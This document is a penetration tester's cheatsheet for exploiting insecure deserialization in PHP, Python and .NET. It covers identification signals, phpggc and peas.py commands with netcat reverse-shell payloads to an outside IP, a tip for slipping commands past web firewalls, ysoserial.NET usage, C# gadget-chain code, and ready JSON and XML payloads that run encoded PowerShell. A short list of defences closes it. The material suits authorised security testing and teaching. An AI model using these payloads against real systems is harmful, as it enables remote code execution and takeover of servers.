# Deserialization Cheatsheet

---

## Black-Box Identification

### Java

|Signal|Value|
|---|---|
|Raw bytes|`AC ED 00 05`|
|Base64 prefix|`rO0...`|

### .NET

|Signal|Value|
|---|---|
|Base64 prefix|`AAEAAAD/////`|
|JSON key|`$type` / `__type`|
|JSON key|`TypeObject`|

## Look for cookie/parameter  `__viewstate`

---

## PHP — phpggc

```bash
# 1. List available gadgets for the target framework
phpggc -l <framework>

# 2. Generate a base64 payload (test multiple gadgets — not all chains work)
phpggc Laravel/RCE9 system 'nc -nv 10.10.17.142 4444 -e /bin/bash' -b
```

---

## Python — peas.py

```bash
python3 ~/Desktop/scripts/python-.../peas.py

# Interactive prompts:
# Enter RCE command     : nc 10.10.17.142 4444 -e /bin/bash
#   (obfuscate if WAF)  : n''c 10.10.17.142 4444 -e /bin/ba''sh
# OS [linux/windows]    : (default linux)
# Base64 encode? [N/y]  : y
# File name to save     : pickle
# Select module         : Pickle | PyYAML | jsonpickle | ruamel.yaml | All
```

> **WAF tip:** Break shell keywords with empty quotes: `n''c`, `/bin/ba''sh`

---

## ysoserial.NET

### Flags

|Flag|Purpose|Examples|
|---|---|---|
|`-f`|Formatter|`Json.NET`, `XmlSerializer`, `BinaryFormatter`|
|`-g`|Gadget|`ObjectDataProvider`, `TypeConfuseDelegate`|
|`-c`|Command|`calc`, `notepad`|
|`-o`|Output format|`Raw`, `Base64`|

### Examples

```powershell
.\ysoserial.exe -f Json.Net -g ObjectDataProvider -c "calc" -o Raw
.\ysoserial.exe -f XmlSerializer -g ObjectDataProvider -c "calc" -o Raw
.\ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc" -o base64
```

---

## Gadget Implementations

### ObjectDataProvider (C#)

```csharp
ObjectDataProvider odp = new ObjectDataProvider();
odp.ObjectType = typeof(System.Diagnostics.Process);
odp.MethodParameters.Add("C:\\Windows\\System32\\cmd.exe");
odp.MethodParameters.Add("/c calc.exe");
odp.MethodName = "Start";
```

### TypeConfuseDelegate (C#)

```csharp
Delegate stringCompare = new Comparison<string>(string.Compare);
Comparison<string> multicastDelegate = (Comparison<string>) MulticastDelegate.Combine(stringCompare, stringCompare);
IComparer<string> comparisonComparer = Comparer<string>.Create(multicastDelegate);
FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
object[] invoke_list = multicastDelegate.GetInvocationList();
invoke_list[1] = new Func<string, string, Process>(Process.Start);
fi.SetValue(multicastDelegate, invoke_list);
SortedSet<string> sortedSet = new SortedSet<string>(comparisonComparer);
sortedSet.Add("/c calc");
sortedSet.Add("C:\\Windows\\System32\\cmd.exe");
```

---

## Payload Formatting Rules

### JSON payloads

1. Move `MethodName` to the **last** key in the object
2. Remove all `\n` newlines — they break the payload

```json
{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodParameters": {
        "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "$values": ["cmd", "/c powershell -nop -enc <BASE64>"]
    },
    "ObjectInstance": {"$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"},
    "MethodName": "Start"
}
```

### XML payloads

1. Remove the root tag wrapper
2. Remove all newlines
3. Move `ObjectInstance` to the top of the element

```xml
<?xml version="1.0"?>
<Tee xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
    <ProjectedProperty0>
        <ObjectInstance xsi:type="XamlReader"></ObjectInstance>
        <MethodName>Parse</MethodName>
        <MethodParameters>
            <anyType xsi:type="xsd:string">
                <![CDATA[<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:b="clr-namespace:System;assembly=mscorlib" xmlns:c="clr-namespace:System.Diagnostics;assembly=system"><ObjectDataProvider d:Key="" ObjectType="{d:Type c:Process}" MethodName="Start"><ObjectDataProvider.MethodParameters><b:String>cmd</b:String><b:String>/c powershell -nop -enc <BASE64></b:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
            </anyType>
        </MethodParameters>
    </ProjectedProperty0>
</Tee>
```

---

## Whitebox — .NET Serializer Sinks

|Serializer|Sink method|
|---|---|
|`BinaryFormatter`|`.Deserialize(...)`|
|`fastJSON`|`JSON.ToObject(...)`|
|`JavaScriptSerializer`|`.Deserialize(...)`|
|`Json.NET`|`JsonConvert.DeserializeObject(...)`|
|`LosFormatter`|`.Deserialize(...)`|
|`NetDataContractSerializer`|`.ReadObject(...)`|
|`ObjectStateFormatter`|`.Deserialize(...)`|
|`SoapFormatter`|`.Deserialize(...)`|
|`XmlSerializer`|`.Deserialize(...)`|
|`YamlDotNet`|`.Deserialize<...>(...)`|

---

## Defense Reminders (for report writing)

1. Avoid deserializing user-controlled input
2. Avoid unnecessary deserialization entirely
3. Use secure serialization mechanisms
4. Enforce explicit/allowlisted types
5. Sign serialized data before transmission
6. Run deserializers under least-privilege accounts